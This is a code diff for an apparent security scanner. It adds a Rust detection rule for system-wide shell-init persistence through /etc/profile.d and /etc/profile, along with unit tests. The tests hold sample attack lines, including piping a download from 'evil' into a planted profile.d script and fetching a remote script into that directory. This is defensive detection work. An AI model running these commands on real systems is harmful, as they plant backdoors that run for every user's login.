@@ -13,6 +13,7 @@ pub fn rules() -> Vec<Rule> {
         ps_009(),
         ps_010(),
         ps_011(),
+        ps_012(),
     ]
 }
 
@@ -362,6 +363,40 @@ fn ps_011() -> Rule {
         cwe_ids: &["CWE-506", "CWE-912"],
     }
 }
+
+fn ps_012() -> Rule {
+    Rule {
+        id: "PS-012",
+        name: "System-wide shell init persistence",
+        description: "Detects writes into /etc/profile.d/ or /etc/profile, which run for every login shell of every user — a system-wide persistence vector distinct from per-user dotfiles (MITRE T1546.004)",
+        severity: Severity::Critical,
+        category: Category::Persistence,
+        confidence: Confidence::Firm,
+        patterns: vec![
+            // Redirect/copy/move/tee/install a payload into a profile.d drop-in
+            Regex::new(r"(>>?|tee|cp|mv|install)\s+[^\n]*/etc/profile\.d/\S+")
+                .expect("PS-012: invalid regex"),
+            // Download directly into a profile.d drop-in
+            Regex::new(r"(curl|wget)\s+[^\n]*/etc/profile\.d/\S+").expect("PS-012: invalid regex"),
+            // Write into the system-wide /etc/profile
+            Regex::new(r"(>>?|tee|cp|mv|install)\s+[^\n]*/etc/profile\b")
+                .expect("PS-012: invalid regex"),
+        ],
+        exclusions: vec![
+            // Comment lines
+            Regex::new(r"^\s*#").expect("PS-012: invalid regex"),
+            // Read-only inspection / sourcing of existing profile scripts
+            Regex::new(r"^\s*(cat|less|stat|grep|ls|source|\.)\s+[^\n]*/etc/profile")
+                .expect("PS-012: invalid regex"),
+        ],
+        message: "System-wide shell init persistence detected: a payload is being written to /etc/profile.d/ or /etc/profile, which runs for every user's login shell.",
+        recommendation: "Artifacts must not write system-wide shell init files. Remove the write and audit /etc/profile.d for planted scripts.",
+        fix_hint: Some(
+            "Delete writes to /etc/profile.d/ and /etc/profile; system-wide shell configuration belongs in reviewed provisioning.",
+        ),
+        cwe_ids: &["CWE-506", "CWE-912"],
+    }
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -558,5 +593,41 @@ mod tests {
         let content = include_str!("../../../tests/fixtures/rules/ps_011.txt");
         let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
         crate::assert_rule_snapshot!("ps_011", findings);
+    }
+
+    #[test]
+    fn test_ps_012_detects_system_shell_init() {
+        let rule = ps_012();
+        let test_cases = vec![
+            // Malicious: writes into /etc/profile.d or /etc/profile
+            (
+                "echo 'curl http://evil|sh' > /etc/profile.d/backdoor.sh",
+                true,
+            ),
+            ("cp payload.sh /etc/profile.d/00-init.sh", true),
+            ("echo 'export EVIL=1' >> /etc/profile", true),
+            ("tee /etc/profile.d/hook.sh < payload", true),
+            ("curl http://evil.example/x.sh -o /etc/profile.d/x.sh", true),
+            // Benign: reads, sourcing, listing
+            ("cat /etc/profile.d/nvm.sh", false),
+            ("source /etc/profile.d/bash_completion.sh", false),
+            ("ls /etc/profile.d/", false),
+            ("echo \"$PROFILE\"", false),
+        ];
+
+        for (input, should_match) in test_cases {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            let result = matched && !excluded;
+            assert_eq!(result, should_match, "PS-012: Failed for input: {}", input);
+        }
+    }
+
+    #[test]
+    fn snapshot_ps_012() {
+        let rule = ps_012();
+        let content = include_str!("../../../tests/fixtures/rules/ps_012.txt");
+        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
+        crate::assert_rule_snapshot!("ps_012", findings);
     }
 }
